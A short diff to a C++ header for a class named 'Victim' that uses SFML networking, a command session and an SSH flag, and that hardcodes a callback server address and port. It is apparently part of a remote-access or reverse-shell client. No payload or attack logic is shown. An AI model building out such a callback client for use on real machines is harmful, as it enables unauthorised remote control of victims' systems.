@@ -1,5 +1,6 @@
 #include <SFML/Network.hpp>
 #include <thread>
+
 #include "cmdSession.hpp"
 
 class Victim {
@@ -19,8 +20,8 @@ private:
 
 	std::thread* sendCmdDataThread = nullptr;
 	CmdSession* cmdSession = nullptr;
-	sf::IpAddress serverIp = sf::IpAddress(0, 0, 0, 0);
-	short serverPort = 443;
+	const sf::IpAddress serverIp = sf::IpAddress(172, 16, 1, 219);
+	const short serverPort = 443;
 
 	bool isInitialized = false;
 	bool isSshActive = false;
